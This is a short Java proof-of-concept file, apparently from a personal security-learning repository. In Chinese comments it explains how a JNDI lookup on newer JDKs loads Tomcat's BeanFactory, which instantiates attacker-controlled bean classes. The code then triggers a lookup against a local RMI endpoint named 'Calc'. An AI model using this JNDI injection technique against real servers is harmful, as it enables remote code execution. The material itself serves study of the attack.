package com.xjjlearning.hack.java.highjdk;

import org.apache.naming.NamingContext;
import org.apache.naming.factory.BeanFactory;

import javax.naming.Context;
import javax.naming.InitialContext;
import javax.naming.NamingException;
import javax.naming.spi.NamingManager;
import java.util.Hashtable;

/**
 * Created by xjj on 2023/3/17.
 */

public class TomcatGadgetPoc {
    public static void main(String[] args) throws NamingException {
        // 1.本地工厂调用逻辑？
        // 所有最终都会调用 InitialContext.lookup()
        //  GenericURLContext.lookup()
        //   RegistryContext.lookup()
        //    NamingManager.getObjectInstance()
        //     factory = getObjectFactoryFromReference(ref, f); -> 关键
        //      NamingManager#helper.loadClass(factoryName); 加载本地工厂并返回

        // 2.本地工厂要求？
        // 工厂类必须实现 javax.naming.spi.ObjectFactory 接口
        // 并且至少存在一个 getObjectInstance() 方法。
        // Tomcat -> BeanFactory

        // 3.本地工厂如何触发反序列化？
        // 要在getObjectInstance()方法中触发:
        //     public Object getObjectInstance(Object obj, Name name, Context nameCtx,
        //                                    Hashtable<?,?> environment)
        // 气宗obj是
        // 整个方法(创建bean的实例):
        //    中会通过反射的方式实例化Reference所指向的任意Bean Class，并且会调用setter方法为所有的属性赋值
        //    而该Bean Class的类名、属性、属性值，全都来自于Reference对象，均是攻击者可控的

//        BeanFactory

        InitialContext initialContext = new InitialContext();
        initialContext.lookup("rmi://127.0.0.1:1099/Calc");
    }
}
